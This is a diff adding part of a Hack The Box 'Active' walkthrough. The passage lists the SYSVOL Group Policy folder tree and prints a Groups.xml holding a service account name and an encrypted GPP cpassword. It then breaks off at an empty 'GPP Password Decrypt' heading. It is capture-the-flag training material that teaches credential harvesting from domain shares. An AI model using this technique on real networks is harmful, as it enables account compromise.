@@ -196,3 +196,69 @@ getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
 ```
 
 <br />
+
+If we make a tree of the folder, we locate more easily interesting files:
+
+<br />
+
+```bash
+❯ tree active.htb
+active.htb
+├── DfsrPrivate
+│   ├── ConflictAndDeleted
+│   ├── Deleted
+│   └── Installing
+├── Policies
+│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
+│   │   ├── GPT.INI
+│   │   ├── Group Policy
+│   │   │   └── GPE.INI
+│   │   ├── MACHINE
+│   │   │   ├── Microsoft
+│   │   │   │   └── Windows NT
+│   │   │   │       └── SecEdit
+│   │   │   │           └── GptTmpl.inf
+│   │   │   ├── Preferences
+│   │   │   │   └── Groups
+│   │   │   │       └── Groups.xml
+│   │   │   └── Registry.pol
+│   │   └── USER
+│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
+│       ├── GPT.INI
+│       ├── MACHINE
+│       │   └── Microsoft
+│       │       └── Windows NT
+│       │           └── SecEdit
+│       │               └── GptTmpl.inf
+│       └── USER
+└── scripts
+
+22 directories, 7 files
+
+```
+
+<br />
+
+The `groups.xml` call my attention:
+
+<br />
+
+```bash
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+```
+
+<br />
+
+It has a `userName` and a `cpassword` field.
+
+<br />
+
+## GPP Password Decrypt:
+
+<br />
+
+
+
+<br />
